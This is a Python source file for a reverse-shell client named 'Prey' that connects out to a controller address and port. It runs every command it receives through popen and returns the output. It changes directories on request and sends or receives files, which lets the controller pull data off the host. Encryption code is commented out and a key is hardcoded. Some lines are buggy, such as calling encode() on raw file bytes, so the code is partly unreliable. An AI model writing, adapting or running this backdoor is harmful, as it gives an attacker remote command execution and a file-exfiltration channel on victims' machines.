#-*-coding: utf-8-*-
from socket import socket, AF_INET, SOCK_STREAM
from cryptography.fernet import Fernet as fern
from time import sleep
from os import popen, chdir, getcwd

class Prey:

	def __init__(self, ip, port, key):
		#self.f = fern(key);
		self.sock = socket(AF_INET, SOCK_STREAM);
		self.sock.connect((ip, port));
		self.shell();

	def shell(self):
		msj = self.sock.recv(1024);
		while(msj):
			#msj = self.f.decrypt(msj).decode();
			msj = msj.decode();
			if(msj[:3] == "get" or msj[:4] == "send"):
				print("!");
				b = False;
				for t in msj.split():
					if(not b):
						b = True;
						do = t; 
					else:
						file = t;
				#msj = self.f.Directorypt(msj).decode();
				if(do == "get"):
					self.sendFile(file);
				else:
					self.getFile(file);
				self.send("Done!");
			elif(msj[:2] == "cd"):
				try:
					chdir(msj[3:]);
				except:
					self.send("Directory not found.");
				else:
					self.send("{}".format(getcwd()));
			else:
				out = popen(msj).read();
				self.send(out);
			msj = self.sock.recv(1024);

	def send(self, m):
		#if(type(m) != type(b"byte")):
		#	m = str(m).encode();
		#m = self.f.encrypt(m);
		self.sock.send(m.encode());

	def sendFile(self, file):
		print("Sending file");
		try:
			with open(file,"rb") as f:
				content = f.read(1024);
		except Exception as e:
			self.send("{}".format(e));
		else:
			self.send(content);
	def getFile(self,  file):
		print("Getting file."),
		try:
			with open(file, "wb") as f:
				content = self.sock.recv(1024);
				f.write(content);
		except Exception as e:
			self.send("There was a problem writting the file.");
		else:
			self.send("The file was sended succesfully!");

def main():
	p = Prey("127.0.0.1", 5000, b"dgjVmVHUY_0GlJ2t8aHX5YfacfGkQcLlcIREQ9nPd7U=");

if __name__ == '__main__':
	main();